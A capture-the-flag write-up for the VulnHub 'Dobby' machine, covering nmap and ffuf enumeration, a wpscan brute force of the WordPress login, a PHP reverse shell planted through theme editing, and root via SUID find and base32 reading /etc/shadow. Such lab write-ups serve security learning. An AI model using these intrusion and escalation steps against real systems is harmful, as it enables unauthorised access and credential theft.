# Dobby
## User flag

First thing as always nmap scan

```shell
nmap -p- -n --min-rate 5000 -sS -Pn -oN allports 192.168.1.39
PORT   STATE SERVICE
80/tcp open  http
```

If we do a more in depth scan to port 80

```shell
nmap -p80 -Pn -sCV -oN targeted 192.168.1.39
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: Draco:dG9vIGVhc3kgbm8/IFBvdHRlcg==
|_http-server-header: Apache/2.4.46 (Ubuntu)
```

The http title is base64 encoded an it says "too easy no? Potter" so just a meaningless Harry Potter reference.The web is just an Apache default site (Although it contains some information I will talk about later) so let's fuzz for more.

Command line : `ffuf -w /home/dasor/wordlist/directory-list-2.3-big.txt -u http://192.168.1.39/FUZZ -recursion -recursion-depth 1
-of md -o ffuf:directories`
  Time: 2022-08-23T11:34:06&#43;02:00

  | FUZZ | URL | Redirectlocation | Position | Status Code | Content Length | Content Words | Content Lines | Content Type | ResultFile |
  | :- | :-- | :--------------- | :---- | :------- | :---------- | :------------- | :------------ | :--------- | :----------- |
  | log | http://192.168.1.39/log |  | 625 | 200 | 45 | 3 | 4 |  |  |
  |  | http://192.168.1.39/ |  | 39970 | 200 | 10977 | 3502 | 409 | text/html |  |
  | server-status | http://192.168.1.39/server-status |  | 110248 | 403 | 277 | 20 | 10 | text/html; charset=iso-8859-1 |  |


If we go to log we get a password and a hint to go to DiagonAlley. The password seems base64 decoded and when you decode it you get "::ilovesocks" another Harry Potter reference in this case to Dobby, it's probably his password.

On DiagonAlley we have a wordpress site run by a user Draco the first post contains brainfuck encoded text that says "donn" and the second post is irrelevant. So the obvious thing to do here is to run wpscan however that didn't report any crucial information. I thought this maybe similar to the [mr.robot machine](mr.robot.md) I already did thus I enumerated users with wpscan an started a bruteforce attack also with wpscan (I tried hydra but it wasn't working However is a better tool for this kinds of attacks)

```shell
wpscan --url http://192.168.1.39/DiagonAlley --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
...
[+] draco
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.1.39/DiagonAlley/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] Draco
 | Found By: Rss Generator (Passive Detection)
```

User draco is valid so let's use rockyou.txt to bruteforce the login

```shell
wpscan --url http://192.168.1.39/DiagonAlley -P ~/wordlist/rockyou.txt -U draco
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
...
[!] Valid Combinations Found:
 | Username: draco, Password: slytherin
```

Right we have the password but, do you remember what I said about the apache page earlier? well it turns out this is not the only way of getting the password since if you look at the html code of the apache page there is a hint that says "Draco's password is his house ;)" Therefore that is another way to log in. You could also do a bit of "social engineering" and create your own Harry Potter wordlist. That's why I marked the machine as very easy because you can solve it in many different ways (not only this step).


Well once logged as an administrator I used the same trick ad in the [mr.robot machine](./mr.robot.md) that is changing the theme of a page to a php reverse shell. In this case I changed the main page to the php reverse shell that can be found [here](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).

Once in I improved the tty and logged as dobby

```shell
 nc -lvp 7777
Connection from 192.168.1.39:51810
Linux HogWarts 5.8.0-26-generic #27-Ubuntu SMP Wed Oct 21 22:29:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:00:02 up  7:39,  0 users,  load average: 0.00, 0.08, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@HogWarts:/$ ^Z
zsh: suspended  nc -lvp 7777
[dasor@archlinux ~]$ stty raw -echo;fg
[1]  + continued  nc -lvp 7777

www-data@HogWarts:/$ stty rows 30 columns 132
www-data@HogWarts:/$ su dobby
Password:
dobby@HogWarts:/$
```

It is important to note that dobby's password is not "::ilikesocks" but "ilikesocks". If you also managed to get the reverse shell but for some reason you don't know the dobby password there is another method. If we search for SUID binaries we have base32 that basically let's us read every file on the system. So just read the dobby entrance on the /etc/shadow file and crack the hash. I honestly thought that this was the way to root and got the flag this way but the vulnhub page clearly said "dobby needs to be root to help harry potter, dobby needs to be a free elf".

## Root flag

So after trying some more things out I though that maybe I was a victim of "tunnel vision" and missed something on other step. I looked at the SUID binaries and found the solution

```shell
dobby@HogWarts:/$ find / -perm -4000 2>/dev/null
/snap/core20/1611/usr/bin/chfn
/snap/core20/1611/usr/bin/chsh
/snap/core20/1611/usr/bin/gpasswd
/snap/core20/1611/usr/bin/mount
/snap/core20/1611/usr/bin/newgrp
/snap/core20/1611/usr/bin/passwd
/snap/core20/1611/usr/bin/su
/snap/core20/1611/usr/bin/sudo
/snap/core20/1611/usr/bin/umount
/snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1611/usr/lib/openssh/ssh-keysign
/snap/snapd/16292/usr/lib/snapd/snap-confine
/snap/core18/1932/bin/mount
/snap/core18/1932/bin/ping
/snap/core18/1932/bin/su
/snap/core18/1932/bin/umount
/snap/core18/1932/usr/bin/chfn
/snap/core18/1932/usr/bin/chsh
/snap/core18/1932/usr/bin/gpasswd
/snap/core18/1932/usr/bin/newgrp
/snap/core18/1932/usr/bin/passwd
/snap/core18/1932/usr/bin/sudo
/snap/core18/1932/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1932/usr/lib/openssh/ssh-keysign
/snap/core18/2538/bin/mount
/snap/core18/2538/bin/ping
/snap/core18/2538/bin/su
/snap/core18/2538/bin/umount
/snap/core18/2538/usr/bin/chfn
/snap/core18/2538/usr/bin/chsh
/snap/core18/2538/usr/bin/gpasswd
/snap/core18/2538/usr/bin/newgrp
/snap/core18/2538/usr/bin/passwd
/snap/core18/2538/usr/bin/sudo
/snap/core18/2538/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2538/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/p11_child
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/proxy_child
/usr/libexec/sssd/selinux_child
/usr/sbin/pppd
/usr/bin/vmware-user-suid-wrapper
/usr/bin/su
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/base32
/usr/bin/gpasswd
/usr/bin/find
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/fusermount
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
```

Do you see another dangerous binary on the list? well it's find that gives us root access just by simply executing this command


```shell
dobby@HogWarts:/$ find . -exec /bin/sh -p \; -quit
# whoami
root
# base32 /root/proof.txt | base32 -d
                                         _ __
        ___                             | '  \
   ___  \ /  ___         ,'\_           | .-. \        /|
   \ /  | |,'__ \  ,'\_  |   \          | | | |      ,' |_   /|
 _ | |  | |\/  \ \ |   \ | |\_|    _    | |_| |   _ '-. .-',' |_   _
// | |  | |____| | | |\_|| |__    //    |     | ,'_`. | | '-. .-',' `. ,'\_
\\_| |_,' .-, _  | | |   | |\ \  //    .| |\_/ | / \ || |   | | / |\  \|   \
 `-. .-'| |/ / | | | |   | | \ \//     |  |    | | | || |   | | | |_\ || |\_|
   | |  | || \_| | | |   /_\  \ /      | |`    | | | || |   | | | .---'| |
   | |  | |\___,_\ /_\ _      //       | |     | \_/ || |   | | | |  /\| |
   /_\  | |           //_____//       .||`      `._,' | |   | | \ `-' /| |
        /_\           `------'        \ |   AND        `.\  | |  `._,' /_\
                                       \|       THE          `.\
                                            _  _  _  _  __ _  __ _ /_
                                           (_`/ \|_)/ '|_ |_)|_ |_)(_
                                           ._)\_/| \\_,|__| \|__| \ _)
                                                           _ ___ _      _
                                                          (_` | / \|\ ||__
                                                          ._) | \_/| \||___


```

I had to use base32 to read since cat was not installed. Overall a great machine with many paths to the final solution!
